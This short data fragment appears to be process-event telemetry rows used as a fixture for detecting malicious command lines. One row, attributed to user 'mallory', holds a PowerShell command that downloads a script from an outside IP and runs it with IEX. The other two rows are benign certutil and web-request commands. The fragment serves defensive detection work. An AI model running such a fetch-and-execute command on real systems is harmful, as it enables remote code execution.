    600, "fin-ws-08", "mallory", "powershell.exe", "", "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/s.ps1')\"", "", "", "cmd.exe", "", "",
    600, "it-ws-01", "alice", "certutil.exe", "", "certutil.exe -hashfile C:\\temp\\setup.msi SHA256", "", "", "cmd.exe", "", "",
    600, "it-ws-02", "bob", "powershell.exe", "", "powershell.exe Invoke-WebRequest https://status.contoso.com/health -UseBasicParsing", "", "", "explorer.exe", "", ""
